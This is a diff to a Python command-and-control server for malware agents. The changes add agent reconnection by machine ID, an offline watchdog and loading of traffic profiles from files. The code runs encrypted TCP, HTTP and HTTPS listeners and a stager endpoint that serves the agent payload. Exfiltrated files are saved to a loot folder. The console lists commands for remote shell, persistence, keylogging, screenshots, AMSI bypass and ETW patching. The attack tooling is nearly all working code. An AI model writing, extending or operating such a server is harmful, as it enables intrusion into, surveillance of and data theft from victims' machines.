@@ -21,9 +21,9 @@ DB_PATH = "c2.db"
 PRIV_PATH, PUB_PATH = "server_private.pem", "server_public.pem"
 CERT_PATH, KEY_PATH = "server.crt", "server.key"
 LOOT_DIR = "loot"
-AGENT_PAYLOAD = "agent_payload.py"  # served to stagers
-BEACON_TIMEOUT = 300                # mark offline after N seconds
-PERSIST_CONN = {}                   # in-memory agent sockets/keys
+AGENT_PAYLOAD = "agent_payload.py"
+BEACON_TIMEOUT = 300
+PERSIST_CONN = {}
 
 
 # ---------- Utilities ----------
@@ -104,6 +104,7 @@ class DB:
                 );
                 CREATE TABLE IF NOT EXISTS agents(
                     id TEXT PRIMARY KEY,
+                    machine_id TEXT,
                     hostname TEXT, username TEXT, os TEXT, os_version TEXT,
                     arch TEXT, pid INTEGER, ip TEXT,
                     session_key TEXT, info_json TEXT,
@@ -128,6 +129,8 @@ class DB:
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     agent_id TEXT, filename TEXT, data BLOB, created_at REAL
                 );
+                CREATE INDEX IF NOT EXISTS idx_agents_machine_id
+                    ON agents(machine_id);
             """)
             self.conn.commit()
 
@@ -146,7 +149,8 @@ class DB:
                 c.execute("INSERT INTO profiles VALUES (?,?,?,?,?,?)",
                           (DEFAULT_PROFILE["name"], DEFAULT_PROFILE["user_agent"],
                            DEFAULT_PROFILE["register_uri"], DEFAULT_PROFILE["beacon_uri"],
-                           DEFAULT_PROFILE["result_uri"], json.dumps(DEFAULT_PROFILE["headers"])))
+                           DEFAULT_PROFILE["result_uri"],
+                           json.dumps(DEFAULT_PROFILE["headers"])))
             self.conn.commit()
 
     def execute(self, sql, args=()):
@@ -160,7 +164,7 @@ class DB:
             return self.conn.execute(sql, args).fetchall()
 
 
-# ---------- Core (shared by every transport) ----------
+# ---------- Core ----------
 class C2Core:
     def __init__(self, db, priv, pub):
         self.db = db
@@ -173,16 +177,40 @@ class C2Core:
         m = {}
         for r in self.db.query("SELECT * FROM profiles"):
             m[r["register_uri"]] = ("register", r["name"])
-            m[r["beacon_uri"]]   = ("beacon", r["name"])
-            m[r["result_uri"]]   = ("result", r["name"])
+            m[r["beacon_uri"]]   = ("beacon",   r["name"])
+            m[r["result_uri"]]   = ("result",   r["name"])
         return m
 
     # ----- agent-facing -----
     def register_agent(self, session_key: bytes, info: dict, ip: str):
+        mid = info.get("machine_id")
+        existing = None
+        if mid:
+            rows = self.db.query(
+                "SELECT id FROM agents WHERE machine_id=?", (mid,))
+            if rows:
+                existing = rows[0]["id"]
+
+        if existing:
+            aid = existing
+            self.db.execute(
+                "UPDATE agents SET session_key=?, last_seen=?, connected=1, "
+                "ip=?, info_json=?, hostname=?, username=?, os=?, "
+                "os_version=?, arch=?, pid=? WHERE id=?",
+                (base64.b64encode(session_key).decode(), time.time(), ip,
+                 json.dumps(info), info.get("hostname", "?"),
+                 info.get("user", "?"), info.get("os", "?"),
+                 info.get("os_version", "?"), info.get("arch", "?"),
+                 info.get("pid", 0), aid))
+            PERSIST_CONN[aid] = {"session_key": session_key, "ip": ip}
+            print(f"\n[+] Agent reconnected: {aid[:8]} "
+                  f"{info.get('hostname')}@{ip}")
+            return aid
+
         aid = str(uuid.uuid4())
         self.db.execute(
-            "INSERT INTO agents VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
-            (aid, info.get("hostname", "?"), info.get("user", "?"),
+            "INSERT INTO agents VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
+            (aid, mid, info.get("hostname", "?"), info.get("user", "?"),
              info.get("os", "?"), info.get("os_version", "?"),
              info.get("arch", "?"), info.get("pid", 0), ip,
              base64.b64encode(session_key).decode(), json.dumps(info),
@@ -203,8 +231,9 @@ class C2Core:
         return base64.b64decode(row[0]["session_key"]) if row else None
 
     def beacon(self, aid):
-        self.db.execute("UPDATE agents SET last_seen=?, connected=1 WHERE id=?",
-                        (time.time(), aid))
+        self.db.execute(
+            "UPDATE agents SET last_seen=?, connected=1 WHERE id=?",
+            (time.time(), aid))
         row = self.db.query(
             "SELECT * FROM tasks WHERE agent_id=? AND status='pending' "
             "ORDER BY created_at ASC LIMIT 1", (aid,))
@@ -217,13 +246,16 @@ class C2Core:
                 "args": json.loads(t["args_json"] or "{}")}
 
     def submit_result(self, aid, task_id, output):
-        self.db.execute("INSERT INTO results(task_id,agent_id,output,created_at) VALUES (?,?,?,?)",
-                        (task_id, aid, output, time.time()))
-        self.db.execute("UPDATE tasks SET status='done', completed_at=? WHERE id=?",
-                        (time.time(), task_id))
-        # extract loot if it was a download
+        self.db.execute(
+            "INSERT INTO results(task_id,agent_id,output,created_at) "
+            "VALUES (?,?,?,?)",
+            (task_id, aid, output, time.time()))
+        self.db.execute(
+            "UPDATE tasks SET status='done', completed_at=? WHERE id=?",
+            (time.time(), task_id))
         row = self.db.query("SELECT * FROM tasks WHERE id=?", (task_id,))
-        if row and row[0]["command"] == "download" and output and not output.startswith("[!]"):
+        if row and row[0]["command"] == "download" and output and \
+                not output.startswith("[!"):
             try:
                 data = base64.b64decode(output)
                 args = json.loads(row[0]["args_json"] or "{}")
@@ -233,20 +265,21 @@ class C2Core:
             except Exception:
                 pass
 
-    # ----- operator-facing (shared by local console + remote operators) -----
+    # ----- operator-facing -----
     def process_command(self, session, cmd):
         name = cmd.get("cmd", "").lower()
         role = session.get("role")
 
         if name == "list":
             rows = self.db.query(
-                "SELECT id,hostname,username,os,ip,last_seen,connected FROM agents "
-                "ORDER BY created_at DESC")
+                "SELECT id,hostname,username,os,ip,last_seen,connected "
+                "FROM agents ORDER BY created_at DESC")
             return {"status": "ok", "agents": [dict(r) for r in rows]}
 
         if name == "use":
             prefix = cmd.get("agent_id", "")
-            rows = self.db.query("SELECT id FROM agents WHERE id LIKE ?", (prefix + "%",))
+            rows = self.db.query("SELECT id FROM agents WHERE id LIKE ?",
+                                 (prefix + "%",))
             if len(rows) != 1:
                 return {"status": "error", "msg": f"{len(rows)} match(es)"}
             session["current_agent"] = rows[0]["id"]
@@ -282,17 +315,19 @@ class C2Core:
                 {"task_id": r["task_id"], "output": r["output"],
                  "time": r["created_at"]} for r in rows]}
 
-        # ---- operator management (admin only) ----
+        # ----- operator management -----
         if name == "list_operators":
             if role != "admin":
                 return {"status": "error", "msg": "admin only"}
-            rows = self.db.query("SELECT username,role,created_at FROM operators")
+            rows = self.db.query(
+                "SELECT username,role,created_at FROM operators")
             return {"status": "ok", "operators": [dict(r) for r in rows]}
 
         if name == "add_operator":
             if role != "admin":
                 return {"status": "error", "msg": "admin only"}
-            u, p, r = cmd.get("username"), cmd.get("password"), cmd.get("role", "operator")
+            u = cmd.get("username"); p = cmd.get("password")
+            r = cmd.get("role", "operator")
             if r not in ("admin", "operator", "viewer"):
                 return {"status": "error", "msg": "bad role"}
             try:
@@ -305,10 +340,11 @@ class C2Core:
         if name == "remove_operator":
             if role != "admin":
                 return {"status": "error", "msg": "admin only"}
-            self.db.execute("DELETE FROM operators WHERE username=?", (cmd["username"],))
+            self.db.execute("DELETE FROM operators WHERE username=?",
+                            (cmd["username"],))
             return {"status": "ok"}
 
-        # ---- profiles ----
+        # ----- profiles -----
         if name == "list_profiles":
             rows = self.db.query("SELECT * FROM profiles")
             return {"status": "ok", "profiles": [dict(r) for r in rows]}
@@ -317,14 +353,19 @@ class C2Core:
             if role != "admin":
                 return {"status": "error", "msg": "admin only"}
             try:
-                self.db.execute("INSERT INTO profiles VALUES (?,?,?,?,?,?)",
-                                (cmd["name"], cmd["user_agent"], cmd["register_uri"],
-                                 cmd["beacon_uri"], cmd["result_uri"],
-                                 json.dumps(cmd.get("headers", {}))))
+                with open(cmd["path"], "r") as f:
+                    p = json.load(f)
+                self.db.execute(
+                    "INSERT INTO profiles VALUES (?,?,?,?,?,?)",
+                    (p["name"], p["user_agent"], p["register_uri"],
+                     p["beacon_uri"], p["result_uri"],
+                     json.dumps(p.get("headers", {}))))
                 self._profiles = self._load_profiles()
-                return {"status": "ok"}
+                return {"status": "ok", "msg": f"profile '{p['name']}' added"}
             except sqlite3.IntegrityError:
                 return {"status": "error", "msg": "profile exists"}
+            except Exception as e:
+                return {"status": "error", "msg": str(e)}
 
         return {"status": "error", "msg": f"unknown command: {name}"}
 
@@ -346,8 +387,8 @@ def tcp_agent_loop(core, conn, addr):
         session_key = base64.b64decode(reg["session_key"])
         aid = core.register_agent(session_key, reg["info"], addr[0])
         send_msg(conn, aes_encrypt(session_key,
-                                   json.dumps({"status": "ok", "agent_id": aid}).encode()))
-
+                                   json.dumps({"status": "ok",
+                                               "agent_id": aid}).encode()))
         while True:
             data = recv_msg(conn)
             if not data:
@@ -372,13 +413,14 @@ def tcp_listener(core):
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST, TCP_PORT))
     s.listen(50)
-    print(f"[*] TCP agent listener  ->  {HOST}:{TCP_PORT}")
+    print(f"[*] TCP agent listener   ->  {HOST}:{TCP_PORT}")
     while True:
         conn, addr = s.accept()
-        threading.Thread(target=tcp_agent_loop, args=(core, conn, addr), daemon=True).start()
+        threading.Thread(target=tcp_agent_loop,
+                         args=(core, conn, addr), daemon=True).start()
 
 
-# ---------- HTTP / HTTPS transport (Flask) ----------
+# ---------- HTTP / HTTPS transport ----------
 def make_flask_app(core):
     app = Flask("c2")
 
@@ -388,15 +430,15 @@ def make_flask_app(core):
         entry = core._profiles.get(uri)
         if not entry:
             return Response("not found", status=404)
-        action, _profile_name = entry
-
+        action, _name = entry
         try:
             if action == "register":
                 reg = json.loads(rsa_decrypt(core.priv, request.get_data()))
                 sk = base64.b64decode(reg["session_key"])
                 aid = core.register_agent(sk, reg["info"], request.remote_addr)
-                return Response(aes_encrypt(sk, json.dumps(
-                    {"status": "ok", "agent_id": aid}).encode()),
+                return Response(
+                    aes_encrypt(sk, json.dumps(
+                        {"status": "ok", "agent_id": aid}).encode()),
                     mimetype="application/octet-stream")
 
             if action == "beacon":
@@ -404,8 +446,9 @@ def make_flask_app(core):
                 sk = core.agent_session_key(aid) if aid else None
                 if not sk:
                     return Response("unauthorized", status=401)
-                return Response(aes_encrypt(sk, json.dumps(core.beacon(aid)).encode()),
-                                mimetype="application/octet-stream")
+                return Response(
+                    aes_encrypt(sk, json.dumps(core.beacon(aid)).encode()),
+                    mimetype="application/octet-stream")
 
             if action == "result":
                 aid = request.headers.get("X-Agent-Id")
@@ -421,11 +464,9 @@ def make_flask_app(core):
 
     @app.route("/stage", methods=["GET"])
     def stage():
-        # serve the full agent payload to stagers
         if os.path.exists(AGENT_PAYLOAD):
             with open(AGENT_PAYLOAD, "rb") as f:
-                data = f.read()
-            return Response(data, mimetype="text/x-python")
+                return Response(f.read(), mimetype="text/x-python")
         return Response("not available", status=404)
 
     return app
@@ -434,7 +475,7 @@ def make_flask_app(core):
 def http_listener(core):
     app = make_flask_app(core)
     srv = make_server(HOST, HTTP_PORT, app, threaded=True)
-    print(f"[*] HTTP agent listener ->  {HOST}:{HTTP_PORT}")
+    print(f"[*] HTTP agent listener  ->  {HOST}:{HTTP_PORT}")
     srv.serve_forever()
 
 
@@ -447,7 +488,7 @@ def https_listener(core):
     srv.serve_forever()
 
 
-# ---------- Operator transport (remote operators, RBAC) ----------
+# ---------- Operator transport ----------
 def operator_loop(core, conn, addr):
     session = None
     try:
@@ -456,17 +497,20 @@ def operator_loop(core, conn, addr):
             return
         login = json.loads(raw)
         if login.get("cmd") != "login":
-            send_msg(conn, json.dumps({"status": "error", "msg": "login required"}).encode())
+            send_msg(conn, json.dumps({"status": "error",
+                                       "msg": "login required"}).encode())
             return
-        user = core.authenticate(login.get("username", ""), login.get("password", ""))
+        user = core.authenticate(login.get("username", ""),
+                                 login.get("password", ""))
         if not user:
-            send_msg(conn, json.dumps({"status": "error", "msg": "invalid credentials"}).encode())
+            send_msg(conn, json.dumps({"status": "error",
+                                       "msg": "invalid credentials"}).encode())
             return
-        send_msg(conn, json.dumps({"status": "ok", "username": user["username"],
+        send_msg(conn, json.dumps({"status": "ok",
+                                   "username": user["username"],
                                    "role": user["role"]}).encode())
         session = {**user, "current_agent": None}
         print(f"[*] Operator '{user['username']}' connected from {addr[0]}")
-
         while True:
             raw = recv_msg(conn)
             if not raw:
@@ -487,13 +531,53 @@ def operator_listener(core):
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST, OP_PORT))
     s.listen(20)
-    print(f"[*] Operator listener   ->  {HOST}:{OP_PORT}")
+    print(f"[*] Operator listener    ->  {HOST}:{OP_PORT}")
     while True:
         conn, addr = s.accept()
-        threading.Thread(target=operator_loop, args=(core, conn, addr), daemon=True).start()
+        threading.Thread(target=operator_loop,
+                         args=(core, conn, addr), daemon=True).start()
 
 
-# ---------- Local admin console ----------
+# ---------- Watchdog ----------
+def offline_watchdog(core):
+    while True:
+        time.sleep(30)
+        cutoff = time.time() - BEACON_TIMEOUT
+        try:
+            core.db.execute(
+                "UPDATE agents SET connected=0 "
+                "WHERE connected=1 AND last_seen < ?", (cutoff,))
+        except Exception:
+            pass
+
+
+# ---------- Local console ----------
+HELP_TEXT = """Commands:
+  list                                 List agents
+  use <id_prefix>                      Select agent
+  back                                 Deselect
+  shell <command>                      Execute shell command (queued)
+  sysinfo                              Remote system info
+  ps                                   Process list
+  env                                  Environment variables
+  download <remote_path>               Exfil file (saved to loot/)
+  upload <local_path> <remote_path>    Push file
+  persist <type>                       cron|rc|systemd|registry|schtask|startup|launchagent
+  screenshot                           Capture screenshot
+  privesc                              Enumerate privilege escalation vectors
+  amsi                                 Windows AMSI bypass
+  etw                                  Windows ETW patch
+  keylog_start | keylog_dump | keylog_stop
+  results                              Show results for selected agent
+  list_operators                       List operators (admin)
+  add_operator <u> <p> <role>          Add operator   (admin)
+  remove_operator <u>                  Remove operator(admin)
+  list_profiles                        List malleable profiles
+  add_profile <path.json>              Add profile from JSON (admin)
+  help                                 Show this
+  exit                                 Shutdown server"""
+
+
 def parse_line(core, session, line):
     parts = line.split(maxsplit=3)
     if not parts:
@@ -513,12 +597,16 @@ def parse_line(core, session, line):
             cmd["remote"] = parts[2]
         except Exception as e:
             return {"status": "error", "msg": str(e)}
+    elif name == "persist" and len(parts) > 1:
+        cmd["kind"] = parts[1]
     elif name == "add_operator" and len(parts) >= 3:
         cmd["username"] = parts[1]
         cmd["password"] = parts[2]
         cmd["role"] = parts[3] if len(parts) > 3 else "operator"
     elif name == "remove_operator" and len(parts) > 1:
         cmd["username"] = parts[1]
+    elif name == "add_profile" and len(parts) > 1:
+        cmd["path"] = parts[1]
     return core.process_command(session, cmd)
 
 
@@ -556,34 +644,16 @@ def display(core, session, result):
             print(f"  {o['username']:20} {o['role']}")
     elif "profiles" in result:
         for p in result["profiles"]:
-            print(f"  {p['name']:15} {p['register_uri']} | {p['beacon_uri']} | {p['result_uri']}")
+            print(f"  {p['name']:15} {p['register_uri']} | "
+                  f"{p['beacon_uri']} | {p['result_uri']}")
+    elif "msg" in result:
+        print(f"[*] {result['msg']}")
     else:
         print(result)
 
 
 def console(core):
-    print("""
-Commands:
-  list                                 List agents
-  use <id_prefix>                      Select agent
-  back                                 Deselect
-  shell <command>                      Execute shell command (queued)
-  sysinfo                              Remote system info
-  ps                                   Process list
-  env                                  Environment variables
-  download <remote_path>               Exfil file (saved to loot/)
-  upload <local_path> <remote_path>    Push file
-  persist <type>                       persistence (cron|rc|systemd|registry|launchagent)
-  screenshot                           Capture screenshot
-  privesc                              Enumerate privilege escalation vectors
-  amsi                                 Windows AMSI bypass
-  etw                                  Windows ETW patch
-  keylog_start | keylog_dump | keylog_stop
-  results                              Show results for selected agent
-  list_operators | add_operator <u> <p> <role> | remove_operator <u>
-  list_profiles | add_profile ...
-  exit                                 Shutdown server
-""")
+    print(HELP_TEXT)
     session = {"username": "admin", "role": "admin", "current_agent": None}
     while True:
         try:
@@ -595,8 +665,7 @@ Commands:
                 print("[*] Shutting down.")
                 os._exit(0)
             if line.lower() == "help":
-                console.__doc__  # noop
-                print("Run the server again to see help, or type 'list'.")
+                print(HELP_TEXT)
                 continue
             r = parse_line(core, session, line)
             display(core, session, r)
@@ -613,12 +682,13 @@ def main():
     db = DB(DB_PATH)
     core = C2Core(db, priv, pub)
 
-    print(f"[*] Server public key: {os.path.abspath(PUB_PATH)}  (copy to agent machine)")
+    print(f"[*] Server public key: {os.path.abspath(PUB_PATH)}  (copy to agent)")
 
     threading.Thread(target=tcp_listener, args=(core,), daemon=True).start()
     threading.Thread(target=http_listener, args=(core,), daemon=True).start()
     threading.Thread(target=https_listener, args=(core,), daemon=True).start()
     threading.Thread(target=operator_listener, args=(core,), daemon=True).start()
+    threading.Thread(target=offline_watchdog, args=(core,), daemon=True).start()
 
     time.sleep(0.5)
     console(core)
